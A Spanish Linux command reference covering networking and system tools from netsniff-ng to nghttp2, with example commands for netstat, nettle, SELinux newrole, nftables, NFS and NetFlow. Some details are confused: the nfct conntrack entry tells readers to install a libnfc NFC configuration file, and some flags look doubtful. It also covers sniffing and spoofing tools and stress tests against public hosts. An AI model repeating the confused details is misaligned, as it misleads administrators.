Es un sniffer de red de alto rendimiento para la inspección de paquetes. Se puede usar para análisis de protocolo, ingeniería inversa o red de depuración. El kit de herramientas netsniff-ng actualmente consta de las siguientes utilidades:
  - netsniff-ng - analizador de paquetes de zero-copy. Herramienta de captura/reproducción pcap
  - trafgen - generador de paquetes de red multiproceso de bajo nivel y zero-copy
  - mausezahn - generador de paquetes de alto nivel para dispositivos con Cisco-CLI
  - ifpps - herramienta de estadísticas de sistema y redes de kernel de primer nivel
  - curvetun - túnel IP multiusuario ligero basado en la curva25519
  - Astraceroute - ruta de seguimiento del sistema autónomo y utilidad de prueba DPI
  - Flowtop - herramienta de seguimiento de conexión de filtro de red superior
  - bpfc - compilación BPF (filtro de paquete Berkeley), desmontaje JIT


netstat
Puertos y conexiones.
# netstat --inet --all
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      852/connmand
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      21928/cupsd
...
Proto.- protocolo, Recv-Q.- paquetes recibidos, Send-Q.- paquetes enviados, Local Address.- direccion local, Foreign Address.- direccion remota, State.- estado de la conexión (listen = a la escucha), PID/Program name:* el ID y el nombre del proceso, así como la ubicación del puerto.
# netstat -ac   (puertos abiertos,donde se dirigen y de donde  vienen)
# netstat -atu | grep '*.*'   (Ver todos los servicios que ofrece la máquina)
# netstat -ta  (Lista los servidores que estén corriendo en el sistema)
# netstat -rn  (Muestra la tabla de enrutamiento)
# netstat  -an (Máxima información de nuestra conexión)
# netstat  -i (Tablas de Interfaces de red)
# netstat -e (información extendida)
# netstat -p (numero de PID y servicio que está corriendo)
# netstat -c (Lista continua)
# netstat -l (Sockets a la espera)
# netstat -napt (puertos abiertos y servicios que corren)
# netstat -pan | grep ESTABLISHED
# netstat -luntp | grep LISTEN | awk '{print $7}'
# netstat -l | grep tcp
# netstat -antp | grep ssh  (preguntar como está un servicio)
# netstat | awk '/EST/{print $5}' | sort  (lista de conexiones establecidas)
# netstat -an | grep -Ec '^tcp.+ESTABLISHED$'  (Muestra conexiones tcp)
# netstat -tpee    (información sobre las conexiones a internet)
# netstat -tunlp  (Muestra servicios activos y a la escucha, pid y puertos)
# if (nc -zw2 lapipaplena.homelinux.com 80); then echo open; fi (Preguntar si el puerto de un host está abierto)
# netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r (Cantidad y estado de los puertos abiertos)
# netstat -luntp | grep LISTEN | awk '{print $7}'  (pid de los servicios en LISTEN y demonio que corre en ellos)
# netstat -n -p|grep SYN_REC | wc -l  (Muestra si estamos sufriendo un ataque ddos)
# netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u (Todas las ip conectadas a nuestro host)
# netstat -plan | grep :80 |  grep ESTABLISHED | awk {'print $5'} | cut -d: -f 1 | sort | uniq -c | sort -n (Otra forma de mostralas)
# netstat -plan | grep :80 | awk {'print $5'} | cut -d: -f 1 | sort | uniq -c | sort -n (número de peticiones al puerto 80 por cada IP)
# netstat -plutn
Explicación de los Flags:
	G (La ruta utiliza una pasarela)
	U (La interfaz está activa)
	H (Esta interfaz permite el acceso a una sola máquina)
	D (Esta ruta es creada dinámicamente)
	M (estee registro ha sido modificado por un mensaje de redirección ICMP)
	! (La ruta es una ruta de rechazo y los datagramas serán descartados)
Nota.- la dirección externa si no es 0.0.0.0.* significa que alguien le está hablando activamente.
Otras opciones:
	-o (indica el número del proceso asignado a la conexión)
	-s (muestra las estadísticas detalladas para cada protocolo)
	-t (muestra solo las conexiones activas por TCP)
	-u (muestra solo las conexiones activas por UDC)


netstress
Utilidad cliente/servidor diseñada para comparar la actividad de la red de un dispositivo o ruta Ethernet determinada utilizando datos y tamaños de paquetes simulados (aleatorios) del mundo real en lugar de datos y tamaños de paquetes fijos.
# netstress -v -m localhost -h 37.128.231.132 -w (con la máxima información, especificando nombre del host y la ip y hacer sólo prueba de escritura lectura/escritura)


nettle-bin
biblioteca criptográfica de bajo nivel diseñada para ser fácilmente integrable en diversos contextos, como kits de herramientas criptográficas para lenguajes orientados a objetos, por ejemplo, C++, Python, Pike y aplicaciones como LSH o GNUPG. También puede ser utilizada en el espacio del kernel. Incluye las herramientas nettle-hash, nettle-lfib-stream, nettle-pbkdf2, pkcs1-conv y sexp-conv.
$ nettle-hash --list (listado de algoritmos soportados)
$ nettle-hash -a sha256 archivo (calculará el hash SHA-256 de archivo)
$ echo "linux es genial" | nettle-hash -a sha512_256 (mostrará el algoritmo SHA512_256 de la frase)
$ nettle-hash -a md5 archivo.pdf (mostrar en formato hexadecimal, por defecto)
$ nettle-lfib-stream (generar 16 bytes aleatorios en binario)
$ nettle-lfib-stream | head -c 20 | xxd (genera bytes aleatorios y los muestra en hex)
$ echo -n "mi_passphrase_secreta" | nettle-pbkdf2 -i 50000 -l 32 "sal_unica" | xxd -p (generar clave desde passphrase)
Varios ejemplos de uso:
$ echo "contraseña_1234" | nettle-pbkdf2 -i 1000 -l 16 "Linux_genial"
$ echo -n "password123" | nettle-pbkdf2 --hex-salt -i 5000 ABCD1234
$ SAL=$(nettle-lfib-stream | head -c 16 | xxd -p) ; echo "Sal generada: $SAL"
$ echo -n "mi_contraseña" | nettle-pbkdf2 --hex-salt --iterations=10000 --length=32 $SAL


netwatch
[netdiag]. Examina todos los paquetes que viajan en una red Ethernet y analiza los paquetes IP. La información se cuenta de acuerdo con los hosts de origen y destino. Una pantalla ncurses indica un estado de lista dual para todos los hosts. La zona izquierda se refiere a hosts LOCALES. La lista de la derecha se refiere a hosts REMOTOS. Es posible examinar estadísticas sobre el número de paquetes, bytes, tipo de servicio IP y último host de comunicación para cada host. Con las teclas de flecha (izquierda y derecha) se cambia la visualización.
# netwatch -n -e eth0 (no resolviendo las ips de la interfaz eth0)


network-test
[ifupdown-extra]. Chequea y verifica que la red funciona como es debido.
# network-test


netwox
Este comando proporciona un menú con más de 200 herramientas [sniffers, spoofing, udp/tcp clients/servers, scan, ping, DNS, FTP, HTTP, IRC, NNTP, SMTP, SNMP, SYSLOG, TELNET, TFTP] para encontrar y resolver problemas de red.
# netwox (entrar en el menú)
Control-c para cerrar el menú


newgrp
Permite cambiar el grupo primario de la sesión actual de shell sin necesidad de cerrar sesión o usar "su" para cambiar de usuario. No pide contraseña a menos que el grupo al que se intenta acceder esté protegido y tambien es necesario que el usuario esté incluido en el grupo al que se intenta cambiar. Se puede verificar con el comando.
$ groups
$ newgrp scripts (para unirte a un grupo llamado "scripts", puedes cambiar temporalmente tu grupo primario a ese grupo)
$ id (Ver tu grupo actual)
$ newgrp scripts -c 'touch archivo.txt' (ejecutar un solo comando bajo otro grupo)
$ exit (te devolverá al grupo original antes de usar newgrp)


newlisp
Lenguaje de scripting de propósito general, similar a LISP para el desarrollo de aplicaciones web y programas en general, así como en los ámbitos de la inteligencia artificial [IA] y la estadística.


newmail
Notificador de correo entrante que suele ejecutarse en segundo plano y monitoriza los archivos del buzón para informar cuando llega un nuevo correo. El remitente y el asunto se mostrarán en la terminal donde se ejecutó. No monitoriza cuentas de correo electrónico externas como Gmail, Outlook, etc, monitoriza el buzón local del sistema como alertas de cron, logwatch, fail2ban, etc, correo enviado entre usuarios locales con mail o sendmail o mensajes del sistema como "disk full", "backup completed" y típicamente se almacena en /var/mail/usuario o /var/spool/mail/usuario
$ newmail -i 30 (monitorizar el buzón en segundo plano actualizando cada 30 segundos)
$ echo "Linux es un sistema genial" | mail -s "Hola desde $(hostname)" $USER (enviarse un correo local uno mismo, al cabo de unos 20-30 segundos llegará a la terminal)


newpid
Lanzar un comando con un nuevo PID.
# newpid htop


newrole
Utilidades principales de políticas de SELinux [Security-Enhanced Linux]. SELinux es un parche del kernel de Linux y varias utilidades con funcionalidades de seguridad mejoradas, diseñadas para añadir controles de acceso obligatorios. Se usan cuando el sistema está en enforcing y la política es el proceso que se lance corra con otro contexto [usuario, rol, tipo, nivel] que el que tendrías normalmente. Incluye las herramientas open_init_pty y run_init
$ newrole -t user_t -- 'firefox &' (lanzar un único comando con otro tipo, no abre shell)
Normalmente "open_init_pty" no se invoca a mano; "run_init" lo usa internamente.
# open_init_pty run_init -- dpkg -i htop_3.2.2-1_amd64.deb (para que el programa que se ejecute dentro del contexto init_t tenga un terminal controlador válido)
# run_init -- dpkg -i ./mi-paquete.deb (instalar un paquete .deb sin desactivar SELinux)
# run_init -- ldconfig (recrear la caché de ldconfig)
# run_init -- /usr/local/sbin/fix-my-daemon.sh (lanzar un script personalizado que toca /etc y /usr/lib/systemd)
# run_init -u staff_u -r staff_r -t staff_t -- /home/alice/bin/actualiza-mis-ficheros (ejecutar como otro usuario-SELinux, poco habitual)
1.-
Pasar de staff_t a sysadm_t
$ id -Z
user_u:staff_r:staff_t:s0
$ newrole -r sysadm_r -t sysadm_t
Password: ******** (pide contraseña de usuario)
# id -Z
user_u:sysadm_r:sysadm_t:s0
Y ya se puede ejecutar apt, dpkg, etc. sin que la política lo bloquee.
2.-
Bajar de privilegio: volver a staff_t
$ newrole -r staff_r -t staff_t
$ id -Z
user_u:staff_r:staff_t:s0
3.-
Cambiar sólo el nivel de confidencialidad
$ newrole -l s0:c5.c9
$ id -Z
user_u:staff_r:staff_t:s0:c5.c9
Nota.- newrole no puede elevar el «usuario-SELinux» [user_u --> root no se puede].


newsbeuter
Lector RSS en consola
$ newsbeuter -i archivo.opml  (cargar los feeds de otra aplicación)
$ newsbeuter -r (arrancar la aplicación obteniendo todas las fuentes)
$ newsbeuter -e (exportar las fuentes a un archivo)
Algunos atajos [newsbeuter -h]:
	q (Subir pantalla/salir de la aplicación)
	Q (Salir de la aplicación)
	C (Marcarlos todos como leidos)
	A (Fuente leida)
	n (Pasar a siguiente fuente no leida)
	p (Pasar a la anterior fuente no leida)
	o (Abrir noticia en el navegador [lynx por defecto ])
	u (Ver listado de URLs de la noticia, Introduciendo el indice la abre)
	/ (Abrir busqueda)
	? (Abrir diálogo de ayuda)
1.-
Algunos ajustes en el archivo de configuración:
$ nano .newsbeuter/config
## Leer fuentes al arrancar la aplicación:
auto-reload yes
## Releer las fuentes cada 15 minutos:
reload-time 15
## Guardar los articulos 15 dias:
keep-articles-days 15
## Navegador que abre la noticia [elinks para ssh y firefox para las X]
#browser "elinks %u"
browser "firefox %u"
## No usar sonido indicando nuevas noticias:
notify-beep no
## Salir sin confirmación:
confirm-exit no
## Usar mplayer para los videos [en las X]
player "mplayer %u"
#### colores soportados: black, red, green, yellow, blue, magenta, cyan y white.
#### Los atributos que pueden especificarse son: standout [Cursiva],
#### underline [Subrayar], reverse [Invertir colores de letra y fondo],
#### blink [parpaderar], dim [oscurecer] y bold [negrita]
## Fondo de pantalla: letra amarilla y fondo negro:
color listnormal yellow black
## Linea de foco: letra roja y fondo blanco:
color listfocus red white
## Primera linea superior y penúltima inferior: letra blanca en negrita y fondo rojo
color info white red bold
## Linea inferior de notificaciónes: letra azul en negrita con fondo negro
color background blue black bold
## Como se muestran los articulos: letra cyan con fondo negro:
color article cyan black
## Foco en nueva noticia no leida: letra blanca en cursiva con fondo amarillo:
color listfocus_unread white yellow standout
## Nuevas noticias no leidas: letra azul con fondo magenta:
color listnormal_unread blue magenta
2.-
Para incorporar los feeds de google reader editar o crear si no existe:
$ nano .newsbeuter/config
texto que se tiene que agregar:
	urls-source "googlereader"
	googlereader-login "login_de_googlereader"
	googlereader-password "contraseña"


newsboat
Lector de noticias RSS.
$ newsboat -i feeds.opml (importar fuentes. Se instalan en el archivo ~/.newsboat/urls que puede que tenga que crearse)
$ newsboat (entrar en la aplicación)
R --> actualizar todos los feeds
r --> recargar una fuente en particular
e --> exportar los feeds
o --> abrir la noticia con el navegador
q --> salir


nfct
[NetFilter ConnTrack]. Herramienta que permite manipular el sistema de seguimiento de conexiones de Netfilter. Su función es inspeccionar, añadir, actualizar y borrar entradas en la tabla de seguimiento de conexiones del núcleo [/proc/net/nf_conntrack]. Es particularmente relevante en sistemas donde se usan firewalls como nftables o iptables con reglas "stateful" basadas en el seguimiento de conexiones, o cuando se requiere diagnóstico avanzado de NAT y conexiones de red. Descargar ejemplo de  archivo de configuración de https://github.com/nfc-tools/libnfc/blob/master/libnfc.conf.sample.
# mkdir /etc/nfc/ (crear direcotorio)
# cp libnfc.conf.sample /etc/nfc/libnfc.conf (copiar la configuración descargada y adaptarla)
# nfct list (muestra todas las conexiones de red actualmente registradas en el sistema de seguimiento)
# nfct list ipv4 (filtra las conexiones activas para mostrar solo las de tipo IPv4)
# nfct list tcp | grep ESTABLISHED (mostrar solo las conexiones TCP ESTABLISHED)
# nfct add tcp 192.168.1.100 45678 203.0.113.5 80 ESTABLISHED mark 42 timeout 3600 (crear una entrada "falsa", útil para pruebas de firewall o NAT. Protocolo TCP, IP origen, puerto, IP destino, puerto, estado ESTABLISHED, marca 42, para iptables con -m mark y 3600 segundos)
# nfct update tcp 192.168.1.100 45678 203.0.113.5 80 \ (actualizar el timeout de una entrada existente)
# nfct delete ip_src=192.168.1.15 ip_dst=8.8.8.8 proto=tcp sport=443 dport=55732 (elimina la entrada de seguimiento que corresponde a esa conexión concreta)
# nfct flush (vaciar toda la tabla, corta todas las conexiones rastreadas)
# nfct event (monitorizar eventos en tiempo real)
# nfct count (muestra un resumen de la cantidad de conexiones por protocolo)


nfdump
Conjunto de herramientas esencial para el análisis de tráfico de red utilizando datos de NetFlow/IPFIX. Se requiere un proceso nfcapd por cada flujo de NetFlow. Incluye las aplicaciones nfanon, nfcapd, nfdump, nfexpire, nfpcapd, nfprofile, nfreplay y nftrack.
$ nfdump -r /ruta/a/nfcapd.202511131800 (muestra el contenido de un archivo específico)
$ nfdump -R /ruta/a/los/flujos (lee recursivamente todos los archivos de flujo en el directorio)
$ nfdump -t 2025/11/13.18:00:00-2025/11/13.18:30:00 -R /ruta/ (muestra flujos dentro de un periodo de 30 minutos)
$ nfdump -R /ruta/a/los/flujos 'proto tcp and src ip 192.168.1.10' (Flujos TCP de una IP de origen específica)
$ nfdump -R /ruta/a/los/flujos 'dst port 80' (flujos con destino a un puerto HTTP [80])
$ nfdump -R /ruta/a/los/flujos 'proto udp and bytes > 10k' (tráfico con más de 10.000 bytes y protocolo UDP)
$ nfdump -R /ruta/a/los/flujos -s srcip/bytes -n 10 (estadísticas de las 10 IP de origen más activas, ordenadas por bytes)
$ nfdump -R /ruta/a/los/flujos -s dstport/flows -n 5 (top 5 de puertos destino, ordenados por número de flujos)
$ nfdump -R /ruta/a/los/flujos -A srcip,dstip (agregación por par [IP origen, IP destino]. Muestra el total de tráfico entre cada par de IP)
$ nfcapd -D -p 9995 -l /var/flows/router1 (Ejecutar como demonio, recibir datos NetFlow en el puerto 9995 y guardarlos en el directorio /var/flows/router1)
$ nfanon -r in.nf -w anon.nf -T 1 (anonimizar un archivo de flujo de entrada "in.nf", guardar el resultado anonimizado en "anon.nf" y utilizando el método de anonimización 1)
$ nfexpire -e 7d -w /var/flows/router1 (limpiar archivos antiguos en /var/flows/router1, manteniendo solo los datos de los últimos 7 días)


nfdump-sflow
sfcapd recopila datos de sflow y los almacena en archivos compatibles. Escucha en un puerto específico las muestras de tráfico sFlow enviadas por dispositivos de red compatibles, como switches o routers. Los datos sFlow recibidos se procesan y se almacenan en archivos de formato nfdump, el mismo formato que usa nfcapd para NetFlow/IPFIX. Esto es clave, ya que permite que todas las herramientas de análisis de la suite nfdump puedan leer y procesar los datos de sFlow. sFlow es un estándar de muestreo de tráfico de red que permite monitorizar grandes volúmenes de tráfico con una sobrecarga mínima en el dispositivo. A diferencia de NetFlow, que generalmente recolecta información de todos los flujos, sFlow toma muestras periódicas de paquetes o estadísticas de interfaz.
$ sfcapd -p 6343 -l /var/sflow/data -t 300 -D (empezar a recibir datos escuchando en el puerto UDP 6343, almacenando los archivos en el directorio /var/sflow/data, rotando los archivos cada 5 minutos y ejecuta el proceso como daemon)
Una vez que sfcapd ha recopilado los datos para analizarlos:
$ nfdump -R /var/sflow/data/ 'proto tcp and port 80' -n 10 -s ip/bytes (lee todos los archivos de datos del directorio, solo tráfico TCP en el puerto 80, muestra los 10 primeros resultados y genera estadísticas agrupadas por dirección IP y ordenadas por bytes)
$ nfdump -R /var/sflow/data/ 'dst ip 192.168.1.100' (mostrar los flujos donde 192.168.1.100 es el destino)


nfoview
Visor sencillo para archivos .nfo, esos típicos archivos de texto con arte ASCII, [dibujos hechos con caracteres] que suelen venir en releases de scene/warez, y que están codificados en CP437, la página de códigos original de DOS. Las ventajas de usar nfoviewer en lugar de un editor de texto son la configuración predefinida de fuentes y codificación, el ajuste automático del tamaño de la ventana y los hipervínculos clicables.
$ nfoview archivo.nfo (abrirá una ventana gráfica con el arte ASCII perfectamente alineado)
$ nfoview --geometry=80x25 archivo.nfo (forzar tamaño de ventana)
$ nfoview release1.nfo release2.nfo info.nfo (abrir varios archivos cada uno en una pestaña)
$ nfoview --encoding=IBM850 archivo.nfo (por defecto usa codificación CP437, pero puedes forzar otra si el archivo está mal)
Nota.- Otras codificaciones comunes: CP437, IBM437, CP850, ISO-8859-1.


nftables
Herramienta que proporciona filtrado y clasificación de paquetes que reemplaza frameworks existentes (iptables, ip6tables, arptables y ebtables). Podemos comprobar si la instalación se ha efectuado correctamente arrancando el modulo con:
# modprobe nf_tables
# modprobe nf_tables_ipv4
Y verificando si está en uso:
# lsmod | grep nf_tables
Formas de uso:
# nft list tables (ver el listado de tablas)
# nft list tables ip (ver listado de la familia ip)
# nft list table ip filter (ver el contenido de una tabla)
# nft add table ip filter (agregar tablas)
# nft delete table ip filter (eliminar tablas)
# nft flush table ip filter (eliminar todas las reglas de una tabla)
# nft add chain ip filter input { type filter hook input priority 0 \; } (agregar cadenas [nat, filter i route])
# nft delete chain ip filter input (eliminar cadenas)
# nft add rule ip filter input tcp dport 80 drop (agregar una regla)
# nft delete rule ip filter input handle 2 (eliminar regla)
# nft add rule filter input iifname eth0 tcp dport 80 counter accep (aceptar paquetes en el puerto 80)
# nft add rule filter input tcp dport 1-1024 counter drop (bloquear tráfico en los puertos del 1 al 1024)


nfs
[nfs-kernel-server]. Servidor de archivos.
En el Servidor:
# nano /etc/exports (Para especificar carpetas que se van a compartir)
Formato de las carpetas que se comparte:
/home/usuario/datos 192.168.1.0/24(rw,no_root_squash,sync)
opciones:
192.168.1.0/24 (Compartida por un rango de ips)
192.168.1.8 (Solo para una ip)
rw (lectura y escritura)
no_root_squash (permite a root del cliente accesos root en el servidor)
async (No sincronizando los datos)
sync (Sincronizando los datos)
# /etc/init.d/nfs-kernel-server restart (reiniciar demonio)
# exportfs -a (Releer el archivo exports si se ha modificado)
En el Cliente
# apt-get install nfs-common (Instalar cliente)
# mount -t nfs 192.168.1.8:/home/usuario/datos /media/servidor
Si se desea en el fstab, colocar la linea:
# nano /etc/fstab
192.168.1.2:/home/usuario/datos /media/servidor nfs rw,user 0 0


nfslogsum
Resume los archivos de registro producidos por el programa nfswatch. Por defecto se resume el archivo de registro nfswatch.log
# nfslogsum -n 10 (las 10 primeras entradas)


nfsstat
Consulta datos sobre el servidor NFS
# nfsstat -m (Muestra datos de los puntos de montaje sólamente)


nfstest
Conjunto de herramientas que permiten probar tanto el cliente como el servidor NFS. Estas herramientas son nfstest_alloc, nfstest_cache, nfstest_delegation, nfstest_dio, nfstest_fcmp, nfstest_file, nfstest_interop, nfstest_io, nfstest_lock, nfstest_pkt, nfstest_pnfs, nfstest_posix, nfstest_rdma, nfstest_sparse, nfstest_ssc, nfstest_xattr y nfstest_xid.
$ nfstest_alloc -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4.2,minorversion=2 (crea un fichero, reserva 100 MiB en el medio y verifica que la cuota libre en el servidor disminuye aunque el fichero siga vacío. -s IP del servidor, -e punto de montaje, -m directorio local donde montar y -o opciones de montaje)
$ nfstest_cache -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4.1,cto (comprueba que atime, mtime, ctime se invalidan correctamente cuando un segundo cliente cambia los metadatos)
$ nfstest_delegation -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4,delegation (fuerza que el servidor conceda una delegación READ o WRITE, desconecta el cliente, modifica el fichero desde otro cliente y comprueba que la delegación se revoca)
$ nfstest_dio -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=3,proto=tcp (verifica que los reads/writes con O_DIRECT no pasan por la cache del cliente y que el tamaño y la alineación respetan los límites del servidor)
$ nfstest_fcmp -s 192.168.56.11 -e /export -m /mnt/nfs --server-path /export/testfile --local-file /mnt/nfs/testfile (comparación de ficheros cliente/servidor. Monta el export, escribe un
patrón, lo sincroniza, lo lee desde el servidor por otro canal [ssh] y compara bit a bit)
$ nfstest_file -s 192.168.56.11 -e /export -m /mnt/nfs (crea, renombra, trunca, elimina, enlaza duro/simbólico, etc. y comprueba que los atributos volátiles se actualizan)
$ nfstest_interop -s 192.168.56.11 -e /export -m /mnt/nfs (prueba casos límite que suelen fallar entre implementaciones distintas)
$ nfstest_io -s 192.168.56.11 -e /export -m /mnt/nfs --pattern=0xdeadbeef --size=1G --blocksize=1M (rendimiento y corrección de I/O comprobación de checksum del fichero resultante)
$ nfstest_lock -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4,lock (ejecuta los clásicos“fcntl/lockf tests: lock exclusivo, shared, deadlock, signal interruption, close-fd free-all, etc)
$ nfstest_pkt -s 192.168.56.11 -e /export -m /mnt/nfs --xid-replay=5 (envía paquetes malformados o con XID duplicado, simula retransmisiones y comprueba que el servidor no corrompe estado)
$ nfstest_pnfs -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4.1,pnfs (útil si el servidor exporta con pnfs; fuerza la concesión de layouts, hace I/O a través del DS y comprueba la devolución)
$ nfstest_posix -s 192.168.56.11 -e /export -m /mnt/nfs (crea miles de ficheros, prueba link-max, name-max, path-max, pipe, fifo, mknod, etc)
$ nfstest_rdma -s 192.168.56.11 -e /export -m /mnt/nfs -o proto=rdma,port=20049 (comprueba que el servidor acepta la negotiación de RDMA y que el cliente puede montar y hacer I/O sin pasar por TCP)
$ nfstest_sparse -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4.2 (escribe solo los bloques 0, 2, 4... y comprueba que st_blocks refleja el espacio real y luego hace un fallocate(FALLOC_FL_PUNCH_HOLE))
$ nfstest_ssc -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4.2 (fuerza una copia en el servidor [CB_COPY] y compara el resultado con una copia local para ver que los datos son idénticos)
$ nfstest_xattr -s 192.168.56.11 -e /export -m /mnt/nfs -o vers=4.2,xattr (crea user.*, system.*, trusted.* y comprueba que listxattr, getxattr, removexattr funcionan y que se propagan al servidor)
$ nfstest_xid -s 192.168.56.11 -e /export -m /mnt/nfs (envía requests con XID = 0, XID = 2³²-1, XID duplicado, etc. y verifica que el servidor responda con el mismo XID y no confunda transacciones)
Nota.- Cada test crea su propio subdirectorio bajo <mntpoint> y lo limpia al terminar; no sobrescribirá los datos.
$ tcpdump -i any -s 0 -w /tmp/nfs.pcap host 192.168.56.11 & (ver el tráfico NFS simultáneamente)
1.-
script para ejecutar el mismo test sobre varias versiones
$ nano versiones_nfstet.sh
   # for v in 3 4 4.1 4.2; do
       nfstest_file -s 192.168.56.11 -e /export -m /mnt/nfs \
                    -o vers=$v --logdir=/tmp/results-v$v
     done


nfstarce
Herramienta de análisis de tráfico de red especializada en el protocolo NFS [Network File System] y realiza filtrado, análisis estadístico y capturas del tráfico NFS en tiempo real. Admite los siguientes protocolos: Ethernet, IPv4, IPv6, UDP, TCP, NFSv3, NFSv4, CIFS
# nfstrace -i eth0 (captura el tráfico NFS en la interfaz eth0 y lo imprime a la salida estándar)
# nfstrace -i eth0 -o nfs_trace.cap (captura tráfico en eth0 y lo guarda en el archivo nfs_trace.cap)
# nfstrace -i eth0 -F "host 192.168.1.100" (captura tráfico en eth0 solo para el servidor NFS con IP 192.168.1.100)
# nfstrace -i eth0 -F "nfsv4" (captura tráfico solo de NFSv4)
# nfstrace -r nfs_trace.cap --summary-stats (lee el archivo nfs_trace.cap y genera un resumen estadístico [latencias, etc.])
# nfstrace -i eth0 -F "nfsv3 and WRITE" (captura y muestra solo las operaciones NFSv3 de escritura [WRITE])
# nfstrace -r nfs_trace.cap --client-stats (muestra estadísticas de latencia agrupadas por host de origen [cliente])


nfswatch
Herramienta para monitorizar el tráfico NFS. Puede capturar y analizar los paquetes NFS en una interfaz de red particular o en todas las interfaces. También monitorea el tráfico de respuesta NFS desde un servidor para medir el tiempo de respuesta de cada RPC.
# nfswatch (entra en el prompt de la aplicación)
Una vez dentro pueden usarse algunas teclas:
	a (mostrar estadísticas sobre usuarios individuales)
	c (mostrar estadísticas sobre hosts de clientes)
	p (mostrar estadísticas sobre procedimientos)
	s (tomar una "instantánea" de la pantalla actual y guárdarla en un archivo)
	- (disminuye el tiempo de ciclo. Por defecto diez segundos)
	+ (aumenta el tiempo del ciclo)
	< (disminuye el tiempo de ciclo en un segundo)
	> (aumenta el tiempo del ciclo en un segundo)
	q (salir)
# nfswatch -all (todos los paquetes desde y hacia la red local)


nftlb
[NFTables Load Balancer - balanceador de carga nftables]. Herramienta de administración de alto nivel que permite configurar fácilmente un balanceador de carga de nivel 4 [L4] utilizando el marco nftables [ve] como backend. La lógica del balanceo no la hace nftables directamente; la hace nftlb, que genera reglas y tablas específicas para que nftables haga el trabajo. Nivel 4 [L4] se refiere al nivel de transporte del modelo OSI: TCP/UDP. Esto significa que nftlb no entiende HTTP, HTTPS, etc., eso sería L7, como HAProxy o NGINX, solo ve direcciones IP y puertos, por ejemplo 192.168.1.10:80.
1.-
Un ejemplo
Balancear tráfico HTTP a 3 servidores: 192.168.1.10:80, 192.168.1.11:80 y 192.168.1.12:80 y se quiere que el balanceador [192.168.1.5] que recibe todas las conexiones al puerto 80, las reparta entre ellos
Configurar el archivo de configuración, crear o editar:
# nano /etc/nftlb/nftlb.conf
[global]
    # Interface de entrada (donde llega el tráfico)
    interface = eth0
[backend http]
    # Protocolo y puerto del servicio
    protocol = tcp
    port = 80
    # Servidores backend
    servers = 192.168.1.10:80, 192.168.1.11:80, 192.168.1.12:80
    # Algoritmo de balanceo: round-robin (por defecto)
    lb_algo = rr
    # Tipo de NAT: DNAT (redirige la conexión)
    lb_type = nat
# systemctl enable nftlb (iniciar el servicio)
# systemctl start nftlb
# nft list ruleset (verificar las reglas generadas)
En la práctica recibe una conexión TCP desde un cliente a 192.168.1.5:80, elige un servidor backend, por round-robin, least connections, etc, cambia la IP de destino [DNAT] a 192.168.1.10:80 y cambia la IP de origen [SNAT] de la respuesta del servidor para que vuelva por el balanceador. El cliente cree que está hablando con 192.168.1.5, pero en realidad está con 192.168.1.10.
Nota.- Si un servidor falla, nftlb lo elimina automáticamente del grupo.


ngetty
[New Getty]. Es un demonio que inicia sesiones de inicio de sesión en terminales de consola virtual, bajo demanda. Es un buen reemplazo para todos esos procesos getty iniciados desde init que, la mayoría de las veces, solo consumen memoria.
# ngetty /dev/tty4 (probar ngetty)
# ngetty -L 115200 /dev/ttyS0 (para línea serie)
# ngetty --login-program=/bin/bash /dev/tty1 (personalización)


nghttp2
El paquete solo instalará un conjunto de programas que implementan el protocolo HTTP/2: un servidor independiente (nghttp2-server), un proxy inverso (nghttp2-proxy) y un cliente (nghttp2-client). nghttp2 no incluye archivos adicionales y no es necesario para que los programas que instala funcionen. Los ejecutables de los 3 programas son h2load y nghttp [nghttp2-client], nghttpd [nghttp2-server] y nghttpx [nghttp2-proxy].
$ nghttp https://nghttp2.org (hacer un GET simple a una web que hable HTTP/2 o HTTP/3)
$ nghttp -ns https://nghttp2.org (ver solo las cabeceras de respuesta. -n no verifica certificado y -s muestra estadísticas al final)
$ nghttp -d datos.json https://httpbin.org/post (hacer un POST con un fichero JSON)
$ nghttp --http3 https://quic.nghttp2.org (forzar HTTP/3 si el servidor lo soporta)
$ nghttp -nv https://nghttp2.org (mostrar información muy detallada del handshake ALPN, prioridades, streams, etc.)
$ h2load -n 1000 -c 100 -m 10 https://nghttp2.org (herramienta de estrés: 100 conexiones, 1000 peticiones totales, 10 en paralelo por conexión)
$ h2load --http3 -n 50000 -c 200 https://quic.nghttp2.org (probar con HTTP/3)
$ h2load -n 25000 -c 50 -m 20 https://localhost:8443 (simular 50 clientes, cada uno haciendo 500 peticiones, máximo 20 peticiones simultáneas por conexión)
$ h2load -n 10000 -c 100 https://localhost/index.html https://localhost/style.css https://localhost/app.js (probar varias URLs distintas)
$ nghttpd 8443 (servidor simple en puerto 8443 con certificado autofirmado que incluye el paquete)
$ nghttpd --cert=mi-cert.pem --private-key=mi-key.pem 443 (usar los propios certificado y clave)
$ nghttpd -d /var/www/mi-web 8443 (servir un directorio concreto, por defecto sirve /usr/share/nghttp2/fetch-ocsp-response si no se indica nada)
$ nghttpd -d /var/www -p "/index.html=/style.css;/index.html=/script.js" 8443 (activar Server Push útil para probar que el cliente HTTP/2 funciona correctamente)
$ nghttpx --frontend="*,443;tls" --backend="127.0.0.1,8080;http" /etc/ssl/mi-cert.pem /etc/ssl/mi-key.pem (terminar TLS, hablar HTTP/2 con el cliente y HTTP/1.1 con el backend)
$ nghttpx --frontend="*,443;tls" --frontend="*,80;no-tls" --backend="192.168.1.10,3000;proto=h2" --backend="192.168.1.11,3000;proto=h2" mi-cert.pem mi-key.pem (aceptar HTTP/1, HTTP/2 y HTTP/3 en el frontend y hablar HTTP/2 con los backends)
$ nghttpx --frontend="*,443;quic" --frontend="*,443;tls" --backend="127.0.0.1,8080" mi-cert.pem mi-key.pem (modo HTTP/3 [QUIC])
